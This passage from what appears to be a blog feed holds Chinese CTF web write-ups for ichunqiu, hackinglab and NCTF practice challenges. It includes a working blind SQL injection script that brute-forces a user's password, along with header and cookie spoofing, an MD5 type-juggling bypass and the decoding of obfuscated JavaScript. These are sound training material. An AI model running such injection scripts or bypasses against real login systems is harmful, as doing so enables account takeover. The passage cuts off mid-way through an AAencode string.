admin123</p><p>登录admin用户，提示只有wuyanzu用户才能拿到flag</p><p>那么我们再爆wuyanzu的密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://8d1802ff177a4d569dafef8aac590cbde77f688da3624512.game.ichunqiu.com/sql.php"</span></span><br><span class="line">all_string = <span class="string">"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm"</span></span><br><span class="line">passwd = <span class="string">""</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'uname'</span>:<span class="string">"wuyanzu'/**/&amp;&amp;/**/mid(passwd/**/from/**/%d/**/for/**/1)/**/in('%s')#"</span>%(i,j),</span><br><span class="line">            <span class="string">'passwd'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'login'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> len(r.text) == <span class="number">75</span>:</span><br><span class="line">            passwd = passwd + j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> len(r.text) == <span class="number">77</span> <span class="keyword">and</span> j == <span class="string">'m'</span>:</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'passwd:'</span>,passwd)</span><br></pre></td></tr></table></figure><p>执行结果passwd: flag{de822b90-2edf-404c-aaeb-8e797768d9ea}</p><p>拿到flag</p>]]></content>
    
    <summary type="html">
    
      ctf-Web
    
    </summary>
    
      <category term="ctf-Web" scheme="https://Foxgrin.github.io/categories/ctf-Web/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>hackinglab-Web</title>
    <link href="https://Foxgrin.github.io//posts/44938/"/>
    <id>https://Foxgrin.github.io//posts/44938/</id>
    <published>2018-08-20T03:16:00.000Z</published>
    <updated>2018-09-04T13:22:50.071Z</updated>
    
    <content type="html"><![CDATA[<p>hackinglab平台Web题解<a id="more"></a></p><h2 id="基础关"><a href="#基础关" class="headerlink" title="基础关"></a>基础关</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p>网址：<a href="http://lab1.xseclab.com/base1_4a4d993ed7bd7d467b27af52d2aaa800/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base1_4a4d993ed7bd7d467b27af52d2aaa800/index.php</a></p><p>源代码找到flag</p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p>给了密文xrlvf23xfqwsxsqf ，需要我们再加密一次，经过查询这是rot13编码，再加密一次得到keyis23ksdjfkfds</p><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><p>给出了base64加密的密文，需要我们不断解密，写个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">password = base64.b64decode(password)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"The Number of encryptions is:"</span>,str(i)</span><br><span class="line"><span class="keyword">print</span> password</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hackinglab/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h3><p>给出了md5加密的密文，直接扔到<a href="https://cmd5.org/解密得bighp" target="_blank" rel="noopener">https://cmd5.org/解密得bighp</a>  </p><h3 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h3><p>网址：<a href="http://lab1.xseclab.com/base1_0ef337f3afbe42d5619d7a36c19c20ab/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base1_0ef337f3afbe42d5619d7a36c19c20ab/index.php</a></p><p>题目说只让外国人访问，用burp抓包看到头部看到Accept-Language: zh-CN,zh;q=0.9字段</p><p>尝试将zh-CN,zh;删除，得到key</p><h3 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h3><p>网址：<a href="http://lab1.xseclab.com/base6_6082c908819e105c378eb93b6631c4d3/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base6_6082c908819e105c378eb93b6631c4d3/index.php</a></p><p>只有HAHA浏览器才能访问页面，浏览器相关信息在User-Agent字段中体现，利用burp抓包在User-Agent字段添加HAHA即可得到key</p><h3 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h3><p>网址：<a href="http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php</a></p><p>key在响应头部字段中</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hackinglab/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h3><p>网址：<a href="http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/index.php</a></p><p>源代码显示访问<a href="http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/search_key.php，可是却跳转到http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/index_no_key.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/search_key.php，可是却跳转到http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/index_no_key.php</a></p><p>明显有重定向</p><p>用burp抓包查看<a href="http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/search_key.php返回信息" target="_blank" rel="noopener">http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/search_key.php返回信息</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hackinglab/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>访问<a href="http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/key_is_here_now_.php" target="_blank" rel="noopener">http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/key_is_here_now_.php</a></p><p>key: ohHTTP302dd </p><h3 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a>第九题</h3><p>网址：<a href="http://lab1.xseclab.com/base9_ab629d778e3a29540dfd60f2e548a5eb/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base9_ab629d778e3a29540dfd60f2e548a5eb/index.php</a></p><p>burp抓包将Cookie: Login=0修改成Cookie: Login=1</p><p>key is: yescookieedit7823789KJ</p><h3 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h3><p>网址：<a href="http://lab1.xseclab.com/base10_0b4e4866096913ac9c3a2272dde27215/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base10_0b4e4866096913ac9c3a2272dde27215/index.php</a></p><p>在控制台中修改input标签的max-length属性值，修改为1000，然后随便post四位数字以上即可</p><p>key is 768HKyu678567&amp;*&amp;K </p><h3 id="第十一题"><a href="#第十一题" class="headerlink" title="第十一题"></a>第十一题</h3><p>网址：<a href="http://lab1.xseclab.com/base11_0f8e35973f552d69a02047694c27a8c9/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base11_0f8e35973f552d69a02047694c27a8c9/index.php</a></p><p>要求本地访问，用burp抓包添加X-Forwarded-For:127.0.0.1</p><p>这里服务器出问题了，直接给出了源代码和key is ^&amp;*(UIHKJjkadshf </p><h3 id="第十二题"><a href="#第十二题" class="headerlink" title="第十二题"></a>第十二题</h3><p>网址：<a href="http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/index.php</a></p><p>尝试了admin.php,login.php等都返回404，试着访问robots.txt，发现文件/9fb97531fe95594603aff7e794ab2f5f/</p><p>访问，提示you find me,but I am not the login page. keep search. </p><p>尝试<a href="http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/9fb97531fe95594603aff7e794ab2f5f/login.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/9fb97531fe95594603aff7e794ab2f5f/login.php</a></p><p>获得key is UIJ%%IOOqweqwsdf </p><h2 id="脚本关"><a href="#脚本关" class="headerlink" title="脚本关"></a>脚本关</h2><h3 id="第一题-1"><a href="#第一题-1" class="headerlink" title="第一题"></a>第一题</h3><p>网址：<a href="http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php</a></p><p>重定向，burp抓包即可得key is : yougotit_script_now</p><h3 id="第二题-1"><a href="#第二题-1" class="headerlink" title="第二题"></a>第二题</h3><p>网址：<a href="http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php</a></p><p>要求我们2秒内计算出值，不然再刷新页面就换成别的算式</p><p>写个脚本计算即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    url = <span class="string">"http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php"</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    r = s.get(url)</span><br><span class="line">    match = re.search(<span class="string">r'\s(.*)=&lt;input'</span>,r.text)</span><br><span class="line">    result = eval(match.group(<span class="number">1</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'v'</span>:result,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'提交'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r = s.post(url,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'key'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hackinglab/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="第三题-1"><a href="#第三题-1" class="headerlink" title="第三题"></a>第三题</h3><p>输入null即可</p><h3 id="第四题-1"><a href="#第四题-1" class="headerlink" title="第四题"></a>第四题</h3><p>源代码中发现js代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b=<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,r</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">''</span>:e(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="built_in">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)r[e(c)]=k[c]||e(c);k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> r[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p&#125;(<span class="string">'1s(1e(p,a,c,k,e,r)&#123;e=1e(c)&#123;1d(c&lt;a?\'\':e(1p(c/a)))+((c=c%a)&gt;1q?1f.1j(c+1k):c.1n(1o))&#125;;1g(!\'\'.1h(/^/,1f))&#123;1i(c--)r[e(c)]=k[c]||e(c);k=[1e(e)&#123;1d r[e]&#125;];e=1e()&#123;1d\'\\\\w+\'&#125;;c=1&#125;;1i(c--)1g(k[c])p=p.1h(1l 1m(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);1d p&#125;(\'Y(R(p,a,c,k,e,r)&#123;e=R(c)&#123;S(c&lt;a?\\\'\\\':e(18(c/a)))+((c=c%a)&gt;17?T.16(c+15):c.12(13))&#125;;U(!\\\'\\\'.V(/^/,T))&#123;W(c--)r[e(c)]=k[c]||e(c);k=[R(e)&#123;S r[e]&#125;];e=R()&#123;S\\\'\\\\\\\\w+\\\'&#125;;c=1&#125;;W(c--)U(k[c])p=p.V(Z 11(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c]);S p&#125;(\\\'G(B(p,a,c,k,e,r)&#123;e=B(c)&#123;A c.L(a)&#125;;E(!\\\\\\\'\\\\\\\'.C(/^/,F))&#123;D(c--)r[e(c)]=k[c]||e(c);k=[B(e)&#123;A r[e]&#125;];e=B()&#123;A\\\\\\\'\\\\\\\\\\\\\\\\w+\\\\\\\'&#125;;c=1&#125;;D(c--)E(k[c])p=p.C(I J(\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\'+e(c)+\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\',\\\\\\\'g\\\\\\\'),k[c]);A p&#125;(\\\\\\\'t(h(p,a,c,k,e,r)&#123;e=o;n(!\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\'.m(/^/,o))&#123;l(c--)r[c]=k[c]||c;k=[h(e)&#123;f r[e]&#125;];e=h()&#123;f\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w+\\\\\\\\\\\\\\\'&#125;;c=1&#125;;l(c--)n(k[c])p=p.m(q s(\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\'+e(c)+\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'g\\\\\\\\\\\\\\\'),k[c]);f p&#125;(\\\\\\\\\\\\\\\'1 3="6";1 4="7";1 5="";8(1 2=0;2&lt;9;2++)&#123;5+=3+4&#125;\\\\\\\\\\\\\\\',j,j,\\\\\\\\\\\\\\\'|u|i|b|c|d|v|x|y|j\\\\\\\\\\\\\\\'.z(\\\\\\\\\\\\\\\'|\\\\\\\\\\\\\\\'),0,&#123;&#125;))\\\\\\\',H,H,\\\\\\\'|||||||||||||||A||B||M||D|C|E|F||I||J|G|N|O||P|Q|K\\\\\\\'.K(\\\\\\\'|\\\\\\\'),0,&#123;&#125;))\\\',X,X,\\\'||||||||||||||||||||||||||||||||||||S|R|V|W|U|T|Y|13|Z|11|14|12|10|19|1a|1b|1c\\\'.14(\\\'|\\\'),0,&#123;&#125;))\',1t,1u,\'|||||||||||||||||||||||||||||||||||||||||||||||||||||1e|1d|1f|1g|1h|1i|1v|1s|1l||1m|1n|1o|1r|1k|1j|1q|1p|1w|1x|1y|1z\'.1r(\'|\'),0,&#123;&#125;))'</span>,<span class="number">62</span>,<span class="number">98</span>,<span class="string">'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||return|function|String|if|replace|while|fromCharCode|29|new|RegExp|toString|36|parseInt|35|split|eval|62|75|53|var|slakfj|teslkjsdflk|for'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> d=<span class="built_in">eval</span>(b);</span><br><span class="line">alert(<span class="string">"key is first 14 chars"</span>+d);</span><br></pre></td></tr></table></figure><p>直接扔到控制台执行后弹窗</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hackinglab/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>截取key is first chars后的十四位就是key</p>]]></content>
    
    <summary type="html">
    
      hacking-Web
    
    </summary>
    
      <category term="hacking-Web" scheme="https://Foxgrin.github.io/categories/hacking-Web/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>nctf-Web</title>
    <link href="https://Foxgrin.github.io//posts/7108/"/>
    <id>https://Foxgrin.github.io//posts/7108/</id>
    <published>2018-08-12T02:48:00.000Z</published>
    <updated>2018-09-04T13:22:50.069Z</updated>
    
    <content type="html"><![CDATA[<p>南京邮电大学ctf平台Web题解<a id="more"></a></p><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>网址：<a href="http://chinalover.sinaapp.com/web1/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web1/</a></p><p>flag在源代码中</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h3><p>网址：<a href="http://chinalover.sinaapp.com/web19/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web19/</a></p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5值碰撞，get参数a=240610708 即可</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h3><p>网址：<a href="http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php</a></p><p>提示我们输入口令zhimakaimen</p><p>但是源代码限制了输入文本的长度，在浏览器检查将长度修改即可输入完整口令</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h3><p>网址：<a href="http://chinalover.sinaapp.com/web2/index.html" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web2/index.html</a></p><p>题目说不是web，看了源代码，抓了包，还真没找出什么，而且后缀名是html</p><p>下载下图片，用Notepad打开，发现最后藏了flag…</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h3><p>网址：<a href="http://chinalover.sinaapp.com/web3/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web3/</a></p><p>用检查的network项发现有个404页面：<a href="http://chinalover.sinaapp.com/web3/404.html" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web3/404.html</a></p><p>进去发现源代码里给了提示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>将jquery-后的字符一一拼凑就是flag，写个脚本快点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">'''&lt;script src="./js/jquery-n.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-c.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-t.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-f.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-&#123;.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-t.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-h.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-i.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-s.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-i.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-s.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-a.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-f.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-l.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-4.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-g.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-&#125;.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>match = re.findall(<span class="string">r'jquery-(.)\.'</span>,s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>match</span><br><span class="line">[<span class="string">'n'</span>, <span class="string">'c'</span>, <span class="string">'t'</span>, <span class="string">'f'</span>, <span class="string">'&#123;'</span>, <span class="string">'t'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'s'</span>, <span class="string">'_'</span>, <span class="string">'i'</span>, <span class="string">'s'</span>, <span class="string">'_'</span>, <span class="string">'a'</span>, <span class="string">'_'</span>, <span class="string">'f'</span>, <span class="string">'l'</span>, <span class="string">'4'</span>, <span class="string">'g'</span>, <span class="string">'&#125;'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = <span class="string">''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> match:</span><br><span class="line">flag = flag + i</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag</span><br><span class="line"><span class="string">'nctf&#123;this_is_a_fl4g&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h3><p>网址：<a href="http://chinalover.sinaapp.com/web20/aaencode.txt" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web20/aaencode.txt</a></p><p>题目给出了提示js 的aaencode</p><p>用火狐浏览器打开时会出现乱码，首先按alt打开菜单，在查看的文字编码中选择unicode编码方式，就能得到这样的一串字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) 